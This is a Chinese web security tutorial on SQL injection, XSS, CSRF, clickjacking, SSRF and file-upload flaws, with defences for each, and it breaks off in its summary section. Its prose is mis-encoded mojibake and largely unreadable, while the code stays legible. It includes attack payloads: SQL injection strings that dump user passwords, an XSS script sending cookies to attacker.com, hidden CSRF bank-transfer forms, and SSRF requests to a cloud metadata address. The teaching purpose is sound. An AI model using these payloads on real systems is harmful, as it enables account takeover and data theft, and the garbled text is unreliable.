---
title: 6ã€Webå®‰å…¨ä¸åº”ç”¨å±‚æ”»å‡»
---
## ğŸ“š ç›®å½•

1. [Webå®‰å…¨æ¦‚è¿°](#1-Webå®‰å…¨æ¦‚è¿°)
2. [SQLæ³¨å…¥æ”»å‡»è¯¦è§£](#2-SQLæ³¨å…¥æ”»å‡»è¯¦è§£)
3. [è·¨ç«™è„šæœ¬æ”»å‡»(XSS)](#3-è·¨ç«™è„šæœ¬æ”»å‡»XSS)
4. [è·¨ç«™è¯·æ±‚ä¼ªé€ (CSRF)](#4-è·¨ç«™è¯·æ±‚ä¼ªé€ CSRF)
5. [å…¶ä»–Webå®‰å…¨å¨èƒ](#5-å…¶ä»–Webå®‰å…¨å¨èƒ)
6. [Webå®‰å…¨é˜²æŠ¤ç­–ç•¥](#6-Webå®‰å…¨é˜²æŠ¤ç­–ç•¥)
7. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#7-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸŒ Webå®‰å…¨æ¦‚è¿°


### 1.1 Webåº”ç”¨å®‰å…¨çš„é‡è¦æ€§


**ğŸ”¸ Webåº”ç”¨é¢ä¸´çš„å¨èƒç¯å¢ƒ**
```
æ”»å‡»é¢å¹¿æ³›ï¼š
â€¢ ç”¨æˆ·è¾“å…¥ç‚¹å¤šï¼ˆè¡¨å•ã€URLå‚æ•°ã€Cookieã€HTTPå¤´ï¼‰
â€¢ ä¸šåŠ¡é€»è¾‘å¤æ‚ï¼Œå®¹æ˜“å‡ºç°æ¼æ´
â€¢ ç›´æ¥é¢å‘äº’è”ç½‘ï¼Œæš´éœ²é£é™©é«˜
â€¢ æ‰¿è½½é‡è¦ä¸šåŠ¡æ•°æ®å’Œç”¨æˆ·ä¿¡æ¯
```

**ğŸ”¸ å¸¸è§æ”»å‡»ç›®æ ‡**
- **æ•°æ®çªƒå–**ï¼šç”¨æˆ·ä¸ªäººä¿¡æ¯ã€ä¸šåŠ¡æ•æ„Ÿæ•°æ®
- **æƒé™è·å–**ï¼šç®¡ç†å‘˜æƒé™ã€ç³»ç»Ÿæ§åˆ¶æƒ
- **æœåŠ¡ç ´å**ï¼šç³»ç»Ÿç˜«ç—ªã€æ•°æ®ç¯¡æ”¹
- **ç»æµæŸå¤±**ï¼šèµ„é‡‘ç›—å–ã€å•†ä¸šä¿¡æ¯æ³„éœ²

### 1.2 Webå®‰å…¨å¨èƒåˆ†ç±»


**ğŸ“Š OWASP Top 10 ä¸»è¦å¨èƒ**
```
1. æ³¨å…¥æ”»å‡»ï¼ˆSQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ï¼‰
2. å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†
3. æ•æ„Ÿæ•°æ®æ³„éœ²
4. XMLå¤–éƒ¨å®ä½“(XXE)æ”»å‡»
5. å¤±æ•ˆçš„è®¿é—®æ§åˆ¶
6. å®‰å…¨é…ç½®é”™è¯¯
7. è·¨ç«™è„šæœ¬æ”»å‡»(XSS)
8. ä¸å®‰å…¨çš„ååºåˆ—åŒ–
9. ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶
10. ä¸è¶³çš„æ—¥å¿—è®°å½•å’Œç›‘æ§
```

---

## 2. ğŸ’‰ SQLæ³¨å…¥æ”»å‡»è¯¦è§£


### 2.1 SQLæ³¨å…¥åŸºæœ¬åŸç†


**ğŸ”¸ æ”»å‡»åŸç†**
```
SQLæ³¨å…¥ï¼šæ”»å‡»è€…é€šè¿‡åœ¨åº”ç”¨ç¨‹åºçš„è¾“å…¥å­—æ®µä¸­æ’å…¥æ¶æ„SQLä»£ç ï¼Œ
ä½¿åº”ç”¨ç¨‹åºæ‰§è¡Œéé¢„æœŸçš„æ•°æ®åº“æ“ä½œï¼Œä»è€Œè·å–ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®
```

**ğŸ”¸ äº§ç”ŸåŸå› **
- **è¾“å…¥éªŒè¯ä¸è¶³**ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå……åˆ†è¿‡æ»¤å’ŒéªŒè¯
- **åŠ¨æ€SQLæ„é€ **ï¼šç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥æ„é€ SQLè¯­å¥
- **æƒé™è¿‡å¤§**ï¼šæ•°æ®åº“ç”¨æˆ·æƒé™é…ç½®è¿‡é«˜
- **é”™è¯¯ä¿¡æ¯æ³„éœ²**ï¼šè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯æš´éœ²æ•°æ®åº“ç»“æ„

### 2.2 SQLæ³¨å…¥æ”»å‡»ç±»å‹


#### ğŸ’Š åŸºäºé”™è¯¯çš„SQLæ³¨å…¥


**ğŸ”¸ æ”»å‡»ç¤ºä¾‹**
```sql
-- æ­£å¸¸æŸ¥è¯¢
SELECT * FROM users WHERE username='admin' AND password='123456';

-- æ¶æ„è¾“å…¥ï¼šadmin' OR '1'='1
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='123456';
-- ç»“æœï¼š'1'='1'æ°¸è¿œä¸ºçœŸï¼Œç»•è¿‡å¯†ç éªŒè¯
```

#### ğŸ•µï¸ ç›²æ³¨æ”»å‡»


**ğŸ”¸ å¸ƒå°”ç›²æ³¨**
```sql
-- é€šè¿‡åˆ¤æ–­é¡µé¢å“åº”å·®å¼‚æ¨æ–­æ•°æ®åº“ä¿¡æ¯
-- æµ‹è¯•æ•°æ®åº“åé•¿åº¦
admin' AND LENGTH(DATABASE())=8 --

-- é€ä½çŒœæµ‹æ•°æ®åº“å
admin' AND SUBSTRING(DATABASE(),1,1)='t' --
```

**ğŸ”¸ æ—¶é—´ç›²æ³¨**
```sql
-- é€šè¿‡å“åº”æ—¶é—´åˆ¤æ–­æ¡ä»¶çœŸå‡
admin' AND IF(LENGTH(DATABASE())=8, SLEEP(5), 0) --
```

#### ğŸ“‹ è”åˆæŸ¥è¯¢æ³¨å…¥


**ğŸ”¸ æ”»å‡»ç¤ºä¾‹**
```sql
-- åŸå§‹æŸ¥è¯¢
SELECT id, name FROM products WHERE category='electronics';

-- æ¶æ„è¾“å…¥ï¼šelectronics' UNION SELECT username,password FROM users --
SELECT id, name FROM products WHERE category='electronics' 
UNION SELECT username,password FROM users --';
```

### 2.3 SQLæ³¨å…¥å±å®³ä¸å½±å“


**ğŸ’¥ æ”»å‡»åæœ**
```
ğŸ”¸ æ•°æ®æ³„éœ²ï¼šè·å–æ•æ„Ÿç”¨æˆ·ä¿¡æ¯ã€å•†ä¸šæœºå¯†
ğŸ”¸ æ•°æ®ç¯¡æ”¹ï¼šä¿®æ”¹ã€åˆ é™¤é‡è¦ä¸šåŠ¡æ•°æ®
ğŸ”¸ æƒé™æå‡ï¼šè·å–ç®¡ç†å‘˜æƒé™ï¼Œæ§åˆ¶æ•´ä¸ªç³»ç»Ÿ
ğŸ”¸ ç³»ç»Ÿç ´åï¼šåˆ é™¤æ•°æ®åº“ã€ç ´åç³»ç»Ÿæ–‡ä»¶
ğŸ”¸ æ‹’ç»æœåŠ¡ï¼šæ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨
```

### 2.4 SQLæ³¨å…¥é˜²æŠ¤æªæ–½


**ğŸ›¡ï¸ é¢„é˜²ç­–ç•¥**

#### ğŸ”’ å‚æ•°åŒ–æŸ¥è¯¢ï¼ˆæ¨èï¼‰

```java
// ä¸å®‰å…¨çš„æ‹¼æ¥æ–¹å¼
String sql = "SELECT * FROM users WHERE username='" + username + "'";

// å®‰å…¨çš„å‚æ•°åŒ–æŸ¥è¯¢
String sql = "SELECT * FROM users WHERE username=?";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setString(1, username);
```

#### âœ‚ï¸ è¾“å…¥éªŒè¯ä¸è¿‡æ»¤

```javascript
// è¾“å…¥éªŒè¯ç¤ºä¾‹
function validateInput(input) {
    // ç™½åå•éªŒè¯ï¼šåªå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿
    const pattern = /^[a-zA-Z0-9_]+$/;
    if (!pattern.test(input)) {
        throw new Error("Invalid input format");
    }
    
    // é•¿åº¦é™åˆ¶
    if (input.length > 50) {
        throw new Error("Input too long");
    }
    
    return input;
}
```

#### ğŸ” æœ€å°æƒé™åŸåˆ™

```sql
-- ä¸ºåº”ç”¨ç¨‹åºåˆ›å»ºä¸“ç”¨æ•°æ®åº“ç”¨æˆ·
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- åªæˆäºˆå¿…è¦çš„æƒé™
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';

-- ç¦æ­¢å±é™©æ“ä½œ
-- ä¸æˆäºˆDROP, ALTER, GRANTç­‰ç®¡ç†æƒé™
```

---

## 3. ğŸ•¸ï¸ è·¨ç«™è„šæœ¬æ”»å‡»(XSS)


### 3.1 XSSæ”»å‡»åŸºæœ¬åŸç†


**ğŸ”¸ æ”»å‡»å®šä¹‰**
```
XSS (Cross-Site Scripting)ï¼šæ”»å‡»è€…åœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ä»£ç ï¼Œ
å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¯¥ç½‘é¡µæ—¶ï¼Œæ¶æ„è„šæœ¬åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œ
ä»è€Œçªƒå–ç”¨æˆ·ä¿¡æ¯æˆ–æ‰§è¡Œæ¶æ„æ“ä½œ
```

### 3.2 XSSæ”»å‡»ç±»å‹


#### ğŸ“š å­˜å‚¨å‹XSSï¼ˆæŒä¹…å‹ï¼‰


**ğŸ”¸ æ”»å‡»æµç¨‹**
```
1. æ”»å‡»è€…åœ¨ç½‘ç«™è¾“å…¥æ¶æ„è„šæœ¬ï¼ˆå¦‚è¯„è®ºã€ç•™è¨€æ¿ï¼‰
2. æœåŠ¡å™¨å°†æ¶æ„è„šæœ¬å­˜å‚¨åˆ°æ•°æ®åº“
3. å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„è„šæœ¬çš„é¡µé¢
4. æ¶æ„è„šæœ¬åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œ
```

**ğŸ’Š æ”»å‡»ç¤ºä¾‹**
```html
<!-- æ”»å‡»è€…åœ¨è¯„è®ºæ¡†è¾“å…¥ -->
<script>
// çªƒå–ç”¨æˆ·Cookie
var cookie = document.cookie;
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + cookie;
</script>

<!-- é¡µé¢æ˜¾ç¤ºæ—¶æ‰§è¡Œæ¶æ„è„šæœ¬ -->
<div class="comment">
    <script>
    var cookie = document.cookie;
    var img = new Image();
    img.src = "http://attacker.com/steal.php?cookie=" + cookie;
    </script>
</div>
```

#### ğŸ”„ åå°„å‹XSSï¼ˆéæŒä¹…å‹ï¼‰


**ğŸ”¸ æ”»å‡»æµç¨‹**
```
1. æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„è„šæœ¬çš„URL
2. è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥
3. æœåŠ¡å™¨å°†æ¶æ„è„šæœ¬åå°„åˆ°å“åº”é¡µé¢
4. æ¶æ„è„šæœ¬åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œ
```

**ğŸ£ æ”»å‡»ç¤ºä¾‹**
```html
<!-- æ¶æ„URL -->
http://example.com/search?q=<script>alert('XSS')</script>

<!-- æœåŠ¡å™¨å“åº”ï¼ˆæœªç»è¿‡æ»¤ï¼‰ -->
<div>æœç´¢ç»“æœï¼š<script>alert('XSS')</script></div>
```

#### ğŸ­ DOMå‹XSS


**ğŸ”¸ æ”»å‡»ç‰¹ç‚¹**
```
ç‰¹ç‚¹ï¼šæ¶æ„è„šæœ¬é€šè¿‡ä¿®æ”¹é¡µé¢DOMç»“æ„æ‰§è¡Œ
åŒºåˆ«ï¼šä¸ç»è¿‡æœåŠ¡å™¨ï¼Œå®Œå…¨åœ¨å®¢æˆ·ç«¯æ‰§è¡Œ
```

**ğŸ’» æ”»å‡»ç¤ºä¾‹**
```javascript
// å­˜åœ¨æ¼æ´çš„JavaScriptä»£ç 
var userInput = location.hash.substring(1);
document.getElementById("content").innerHTML = userInput;

// æ¶æ„URL
http://example.com/page.html#<script>alert('DOM XSS')</script>
```

### 3.3 XSSæ”»å‡»å±å®³


**ğŸ’¥ æ”»å‡»åæœ**
```
ğŸ”¸ Cookieçªƒå–ï¼šè·å–ç”¨æˆ·ä¼šè¯ä¿¡æ¯ï¼ŒåŠ«æŒç”¨æˆ·è´¦æˆ·
ğŸ”¸ æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼šçªƒå–ç”¨æˆ·è¾“å…¥çš„å¯†ç ã€ä¸ªäººä¿¡æ¯
ğŸ”¸ æ¶æ„æ“ä½œï¼šä»¥ç”¨æˆ·èº«ä»½æ‰§è¡Œéæˆæƒæ“ä½œ
ğŸ”¸ ç½‘é¡µæŒ‚é©¬ï¼šé‡å®šå‘åˆ°æ¶æ„ç½‘ç«™ï¼Œä¼ æ’­æ¶æ„è½¯ä»¶
ğŸ”¸ é”®ç›˜è®°å½•ï¼šè®°å½•ç”¨æˆ·é”®ç›˜è¾“å…¥ï¼Œçªƒå–æ•æ„Ÿä¿¡æ¯
```

### 3.4 XSSé˜²æŠ¤æªæ–½


**ğŸ›¡ï¸ é˜²æŠ¤ç­–ç•¥**

#### ğŸ§¹ è¾“å…¥è¿‡æ»¤ä¸è¾“å‡ºç¼–ç 

```html
<!-- HTMLå®ä½“ç¼–ç  -->
åŸå§‹è¾“å…¥ï¼š<script>alert('xss')</script>
ç¼–ç åï¼š&lt;script&gt;alert('xss')&lt;/script&gt;

<!-- JavaScriptç¼–ç  -->
åŸå§‹è¾“å…¥ï¼š'; alert('xss'); //
ç¼–ç åï¼š\x27; alert(\x27xss\x27); //
```

#### ğŸ¯ å†…å®¹å®‰å…¨ç­–ç•¥(CSP)

```html
<!-- HTTPå“åº”å¤´è®¾ç½®CSP -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

<!-- HTML metaæ ‡ç­¾è®¾ç½® -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

#### ğŸª HttpOnly Cookie

```javascript
// è®¾ç½®HttpOnly Cookieï¼Œé˜²æ­¢JavaScriptè®¿é—®
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## 4. ğŸª è·¨ç«™è¯·æ±‚ä¼ªé€ (CSRF)


### 4.1 CSRFæ”»å‡»åŸºæœ¬åŸç†


**ğŸ”¸ æ”»å‡»å®šä¹‰**
```
CSRF (Cross-Site Request Forgery)ï¼šæ”»å‡»è€…è¯±å¯¼ç”¨æˆ·åœ¨å·²è®¤è¯çš„ç½‘ç«™ä¸Š
æ‰§è¡Œéé¢„æœŸçš„æ“ä½œï¼Œåˆ©ç”¨ç”¨æˆ·çš„èº«ä»½å’Œæƒé™å®Œæˆæ¶æ„è¯·æ±‚
```

**ğŸ”¸ æ”»å‡»æ¡ä»¶**
- ç”¨æˆ·å·²åœ¨ç›®æ ‡ç½‘ç«™ç™»å½•ï¼ˆå­˜åœ¨æœ‰æ•ˆä¼šè¯ï¼‰
- ç›®æ ‡ç½‘ç«™ä¾èµ–Cookieè¿›è¡Œèº«ä»½éªŒè¯
- æ”»å‡»è€…èƒ½å¤Ÿé¢„æµ‹è¯·æ±‚çš„å‚æ•°å’Œæ ¼å¼

### 4.2 CSRFæ”»å‡»æµç¨‹


**ğŸ¯ å…¸å‹æ”»å‡»åœºæ™¯**
```
1. ç”¨æˆ·ç™»å½•é“¶è¡Œç½‘ç«™Aï¼Œè·å¾—è®¤è¯Cookie
2. ç”¨æˆ·åœ¨æœªé€€å‡ºAçš„æƒ…å†µä¸‹è®¿é—®æ¶æ„ç½‘ç«™B
3. ç½‘ç«™BåŒ…å«å‘ç½‘ç«™Aå‘èµ·è½¬è´¦è¯·æ±‚çš„ä»£ç 
4. ç”¨æˆ·æµè§ˆå™¨è‡ªåŠ¨æºå¸¦Cookieå‘ç½‘ç«™Aå‘é€è¯·æ±‚
5. ç½‘ç«™AéªŒè¯Cookieæœ‰æ•ˆï¼Œæ‰§è¡Œè½¬è´¦æ“ä½œ
```

### 4.3 CSRFæ”»å‡»ç¤ºä¾‹


**ğŸ’° GETè¯·æ±‚æ”»å‡»**
```html
<!-- æ¶æ„ç½‘ç«™Bçš„é¡µé¢ä»£ç  -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" 
     style="display:none">

<!-- æˆ–ä½¿ç”¨JavaScriptè‡ªåŠ¨æäº¤ -->
<script>
window.onload = function() {
    var img = new Image();
    img.src = "http://bank.com/transfer?to=attacker&amount=10000";
}
</script>
```

**ğŸ“ POSTè¯·æ±‚æ”»å‡»**
```html
<!-- è‡ªåŠ¨æäº¤çš„è¡¨å• -->
<form id="maliciousForm" action="http://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>

<script>
document.getElementById('maliciousForm').submit();
</script>
```

### 4.4 CSRFé˜²æŠ¤æªæ–½


**ğŸ›¡ï¸ é˜²æŠ¤ç­–ç•¥**

#### ğŸ« CSRF Token

```html
<!-- åœ¨è¡¨å•ä¸­æ·»åŠ éšæœºToken -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6">
    <input type="text" name="to" placeholder="æ”¶æ¬¾è´¦æˆ·">
    <input type="number" name="amount" placeholder="è½¬è´¦é‡‘é¢">
    <button type="submit">è½¬è´¦</button>
</form>
```

```python
# æœåŠ¡å™¨ç«¯éªŒè¯Token
def transfer(request):
    token = request.POST.get('csrf_token')
    session_token = request.session.get('csrf_token')
    
    if not token or token != session_token:
        return HttpResponse("CSRF token mismatch", status=403)
    
    # æ‰§è¡Œè½¬è´¦æ“ä½œ
    perform_transfer(request.POST)
```

#### ğŸª SameSite Cookie

```javascript
// è®¾ç½®SameSiteå±æ€§é˜²æ­¢è·¨ç«™è¯·æ±‚æºå¸¦Cookie
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly

// SameSiteé€‰é¡¹è¯´æ˜
// Strict: å®Œå…¨ç¦æ­¢è·¨ç«™è¯·æ±‚æºå¸¦Cookie
// Lax: éƒ¨åˆ†è·¨ç«™è¯·æ±‚å¯æºå¸¦Cookieï¼ˆå¦‚é“¾æ¥è·³è½¬ï¼‰
// None: å…è®¸è·¨ç«™è¯·æ±‚æºå¸¦Cookieï¼ˆéœ€è¦Secureï¼‰
```

#### ğŸ” RefereréªŒè¯

```python
def transfer(request):
    referer = request.META.get('HTTP_REFERER', '')
    allowed_domains = ['https://bank.com', 'https://www.bank.com']
    
    if not any(referer.startswith(domain) for domain in allowed_domains):
        return HttpResponse("Invalid referer", status=403)
    
    # æ‰§è¡Œè½¬è´¦æ“ä½œ
    perform_transfer(request)
```

---

## 5. ğŸ•·ï¸ å…¶ä»–Webå®‰å…¨å¨èƒ


### 5.1 ç‚¹å‡»åŠ«æŒ(Clickjacking)


**ğŸ”¸ æ”»å‡»åŸç†**
```
ç‚¹å‡»åŠ«æŒï¼šæ”»å‡»è€…ä½¿ç”¨é€æ˜æˆ–ä¸å¯è§çš„iframeå°†ç›®æ ‡ç½‘ç«™åµŒå…¥åˆ°æ¶æ„é¡µé¢ä¸­ï¼Œ
è¯±å¯¼ç”¨æˆ·ç‚¹å‡»çœ‹ä¼¼æ— å®³çš„æŒ‰é’®ï¼Œå®é™…ä¸Šæ˜¯åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ‰§è¡Œæ“ä½œ
```

**ğŸ­ æ”»å‡»ç¤ºä¾‹**
```html
<!-- æ¶æ„é¡µé¢ -->
<div style="position: relative;">
    <iframe src="http://bank.com/transfer" 
            style="opacity: 0; position: absolute; top: 0; left: 0; 
                   width: 100%; height: 100%;"></iframe>
    <button style="position: relative; z-index: -1;">
        ç‚¹å‡»è·å¾—å…è´¹ç¤¼å“
    </button>
</div>
```

**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**
```html
<!-- X-Frame-Optionså“åº”å¤´ -->
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com

<!-- ä½¿ç”¨CSP frame-ancestorsæŒ‡ä»¤ -->
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
```

### 5.2 æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ (SSRF)


**ğŸ”¸ æ”»å‡»åŸç†**
```
SSRFï¼šæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„URLå‚æ•°ï¼Œä½¿æœåŠ¡å™¨å‘æ”»å‡»è€…æŒ‡å®šçš„åœ°å€å‘èµ·è¯·æ±‚ï¼Œ
ä»è€Œè®¿é—®å†…ç½‘èµ„æºæˆ–æ‰§è¡Œæœªæˆæƒæ“ä½œ
```

**ğŸ¯ æ”»å‡»ç¤ºä¾‹**
```python
# å­˜åœ¨SSRFæ¼æ´çš„ä»£ç 
def fetch_url(request):
    url = request.GET.get('url')
    response = requests.get(url)  # ç›´æ¥è¯·æ±‚ç”¨æˆ·æä¾›çš„URL
    return HttpResponse(response.content)

# æ¶æ„è¯·æ±‚
# http://example.com/fetch?url=http://localhost:22
# http://example.com/fetch?url=http://169.254.169.254/metadata
```

**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**
```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        # åªå…è®¸HTTP/HTTPSåè®®
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # æ£€æŸ¥IPåœ°å€ï¼Œç¦æ­¢å†…ç½‘IP
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            return False
            
        return True
    except:
        return False

def fetch_url(request):
    url = request.GET.get('url')
    if not is_safe_url(url):
        return HttpResponse("Invalid URL", status=400)
    
    response = requests.get(url, timeout=5)
    return HttpResponse(response.content)
```

### 5.3 æ–‡ä»¶ä¸Šä¼ æ¼æ´


**ğŸ”¸ æ”»å‡»ç±»å‹**
```
ğŸ”¸ æ–‡ä»¶ç±»å‹ç»•è¿‡ï¼šä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.php, .jsp, .aspï¼‰
ğŸ”¸ æ–‡ä»¶å†…å®¹æ³¨å…¥ï¼šåœ¨å›¾ç‰‡ç­‰æ–‡ä»¶ä¸­åµŒå…¥æ¶æ„ä»£ç 
ğŸ”¸ è·¯å¾„éå†ï¼šé€šè¿‡../ç­‰è·¯å¾„æ“ä½œè®¿é—®ç³»ç»Ÿæ–‡ä»¶
ğŸ”¸ æ–‡ä»¶åŒ…å«ï¼šåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œä¸Šä¼ çš„æ¶æ„æ–‡ä»¶
```

**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**
```python
import magic
import os

def secure_upload(file):
    # æ–‡ä»¶ç±»å‹ç™½åå•
    allowed_types = ['image/jpeg', 'image/png', 'image/gif']
    
    # æ£€æŸ¥MIMEç±»å‹
    file_type = magic.from_buffer(file.read(1024), mime=True)
    if file_type not in allowed_types:
        raise ValueError("File type not allowed")
    
    # æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
    filename = file.name.lower()
    allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif']
    if not any(filename.endswith(ext) for ext in allowed_extensions):
        raise ValueError("File extension not allowed")
    
    # ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å
    safe_filename = str(uuid.uuid4()) + os.path.splitext(filename)[1]
    
    # å­˜å‚¨åˆ°å®‰å…¨ç›®å½•
    upload_path = os.path.join('/safe/uploads/', safe_filename)
    
    return upload_path
```

---

## 6. ğŸ›¡ï¸ Webå®‰å…¨é˜²æŠ¤ç­–ç•¥


### 6.1 è¾“å…¥éªŒè¯ä¸è¾“å‡ºç¼–ç 


**ğŸ” è¾“å…¥éªŒè¯åŸåˆ™**
```
ğŸ”¸ ç™½åå•éªŒè¯ï¼šåªå…è®¸é¢„æœŸçš„è¾“å…¥æ ¼å¼å’Œå†…å®¹
ğŸ”¸ é•¿åº¦é™åˆ¶ï¼šé™åˆ¶è¾“å…¥æ•°æ®çš„é•¿åº¦
ğŸ”¸ ç±»å‹æ£€æŸ¥ï¼šéªŒè¯æ•°æ®ç±»å‹æ˜¯å¦ç¬¦åˆé¢„æœŸ
ğŸ”¸ æ ¼å¼éªŒè¯ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼éªŒè¯æ ¼å¼
ğŸ”¸ ä¸šåŠ¡é€»è¾‘éªŒè¯ï¼šéªŒè¯æ•°æ®æ˜¯å¦ç¬¦åˆä¸šåŠ¡è§„åˆ™
```

**ğŸ“ è¾“å‡ºç¼–ç ç­–ç•¥**
```html
<!-- HTMLä¸Šä¸‹æ–‡ç¼–ç  -->
<div>ç”¨æˆ·åï¼š${fn:escapeXml(username)}</div>

<!-- JavaScriptä¸Šä¸‹æ–‡ç¼–ç  -->
<script>
var username = "${fn:escapeJavaScript(username)}";
</script>

<!-- URLä¸Šä¸‹æ–‡ç¼–ç  -->
<a href="profile.jsp?user=${fn:escapeUrl(username)}">æŸ¥çœ‹èµ„æ–™</a>

<!-- CSSä¸Šä¸‹æ–‡ç¼–ç  -->
<div style="color: ${fn:escapeCss(userColor)};">æ–‡æœ¬</div>
```

### 6.2 ä¼šè¯ç®¡ç†å®‰å…¨


**ğŸª å®‰å…¨çš„Cookieè®¾ç½®**
```javascript
// å®‰å…¨çš„Cookieå±æ€§è®¾ç½®
Set-Cookie: sessionid=abc123; 
            HttpOnly;           // é˜²æ­¢XSSè®¿é—®
            Secure;             // ä»…HTTPSä¼ è¾“
            SameSite=Strict;    // é˜²æ­¢CSRF
            Max-Age=3600;       // è®¾ç½®è¿‡æœŸæ—¶é—´
            Path=/;             // é™åˆ¶ä½œç”¨è·¯å¾„
            Domain=.example.com // é™åˆ¶ä½œç”¨åŸŸå
```

**ğŸ”„ ä¼šè¯ç®¡ç†æœ€ä½³å®è·µ**
```python
# ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤
def login(request, username, password):
    if authenticate(username, password):
        # ç™»å½•æˆåŠŸåé‡æ–°ç”Ÿæˆä¼šè¯ID
        request.session.cycle_key()
        request.session['user_id'] = user.id
        request.session['login_time'] = time.time()
        
        # è®¾ç½®ä¼šè¯è¶…æ—¶
        request.session.set_expiry(3600)  # 1å°æ—¶åè¿‡æœŸ
        
        return redirect('dashboard')

# ä¼šè¯è¶…æ—¶æ£€æŸ¥
def check_session_timeout(request):
    login_time = request.session.get('login_time')
    if login_time and time.time() - login_time > 3600:
        request.session.flush()  # æ¸…é™¤ä¼šè¯
        return redirect('login')
```

### 6.3 å®‰å…¨å¤´è®¾ç½®


**ğŸ”’ é‡è¦çš„å®‰å…¨å“åº”å¤´**
```html
<!-- å†…å®¹å®‰å…¨ç­–ç•¥ -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

<!-- é˜²æ­¢ç‚¹å‡»åŠ«æŒ -->
X-Frame-Options: SAMEORIGIN

<!-- é˜²æ­¢MIMEç±»å‹å—…æ¢ -->
X-Content-Type-Options: nosniff

<!-- XSSä¿æŠ¤ -->
X-XSS-Protection: 1; mode=block

<!-- å¼ºåˆ¶HTTPS -->
Strict-Transport-Security: max-age=31536000; includeSubDomains

<!-- æ¨èæƒé™ç­–ç•¥ -->
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

## 7. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 7.1 å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæ¦‚å¿µ


```
ğŸ”¸ SQLæ³¨å…¥ï¼šé€šè¿‡æ¶æ„SQLä»£ç è·å–æ•°æ®åº“è®¿é—®æƒé™
ğŸ”¸ XSSæ”»å‡»ï¼šåœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œçªƒå–ç”¨æˆ·ä¿¡æ¯
ğŸ”¸ CSRFæ”»å‡»ï¼šåˆ©ç”¨ç”¨æˆ·èº«ä»½æ‰§è¡Œéæˆæƒæ“ä½œ
ğŸ”¸ ç‚¹å‡»åŠ«æŒï¼šé€šè¿‡é€æ˜iframeè¯±å¯¼ç”¨æˆ·ç‚¹å‡»
ğŸ”¸ SSRFæ”»å‡»ï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œè®¿é—®å†…ç½‘èµ„æº
```

### 7.2 å…³é”®é˜²æŠ¤åŸåˆ™


**ğŸ”¹ è¾“å…¥éªŒè¯ä¸è¾“å‡ºç¼–ç **
```
æ‰€æœ‰ç”¨æˆ·è¾“å…¥éƒ½æ˜¯ä¸å¯ä¿¡çš„ â†’ ä¸¥æ ¼éªŒè¯è¾“å…¥
æ‰€æœ‰è¾“å‡ºéƒ½è¦ç¼–ç  â†’ é˜²æ­¢æ¶æ„è„šæœ¬æ‰§è¡Œ
ç™½åå•ä¼˜äºé»‘åå• â†’ åªå…è®¸é¢„æœŸçš„è¾“å…¥
```

**ğŸ”¹ æœ€å°æƒé™åŸåˆ™**
```
